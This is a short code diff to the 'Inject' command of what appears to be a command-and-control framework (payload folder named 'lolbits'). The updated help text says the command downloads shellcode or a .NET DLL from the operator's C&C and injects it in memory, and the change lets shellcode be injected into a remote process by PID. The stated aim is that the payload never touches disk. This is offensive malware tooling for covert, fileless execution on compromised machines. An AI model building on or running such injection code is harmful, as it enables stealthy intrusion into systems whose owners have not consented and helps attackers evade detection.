@@ -7,7 +7,7 @@ import json
 class Inject(Command): 
 
 
-	__payloads = "C:\\inetpub\\wwwroot\\final\\payloads\\"
+	__payloads = "C:\\inetpub\\wwwroot\\lolbits\\payloads\\"
 
 	def printMessage(self):
 
@@ -17,7 +17,8 @@ class Inject(Command):
 
 		helpstr = """\n Download and inject in memory a shellcode (.bin) or dll file from your C&C.
 	\n ** USAGE FOR DLL **: inject <dll path> <method to execute> [arg1 [arg2]]
-	\n ** USAGE FOR SHELLCODE **: inject <shellcode path> 
+	\n ** USAGE FOR SHELLCODE **: inject <shellcode path> [PID]
+	\n [+] Dll is always injected in the own shell process; shellcode can be injected in a remote process as well.
 	\n [+] The payload won't touch disk. The dll must be a .NET assembly.	
 		"""
 
@@ -69,7 +70,5 @@ class Inject(Command):
 				return False	
 						
 			self.printMessage()
-			#command = self.parseArgs(None, cmdSpl, None)
 			self.writeCommandInFile(cmdSpl, prevId, nextId, filePath)
-			#os.system(command) 
 			return True
